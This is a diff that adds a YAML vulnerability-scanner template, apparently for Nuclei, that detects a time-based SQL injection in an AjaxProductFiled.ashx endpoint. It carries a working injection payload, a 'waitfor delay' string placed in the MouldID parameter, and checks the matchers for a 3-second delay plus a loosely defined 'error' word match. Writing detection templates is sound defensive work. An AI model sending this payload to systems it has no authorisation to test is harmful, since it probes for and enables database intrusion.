@@ -1,0 +1,29 @@
+id: ajaxproductfiled-sql-injection
+
+info:
+  name: AjaxProductFiled SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Identifies SQL Injection vulnerability in AjaxProductFiled.ashx endpoint by inducing a delay in the response time using the `waitfor delay` payload.
+  tags: sql-injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/m/Dingding/Ajax/AjaxProductFiled.ashx?method=savePuductFiled&MouldID=-1%27waitfor+delay%270:0:3%27--"
+    headers:
+      Accept-Encoding: gzip
+      Connection: keep-alive
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration > 3000"
+      - type: word
+        part: body
+        words:
+          - "error" # Adjust this based on the actual error message or response indicating a SQL error or delay.
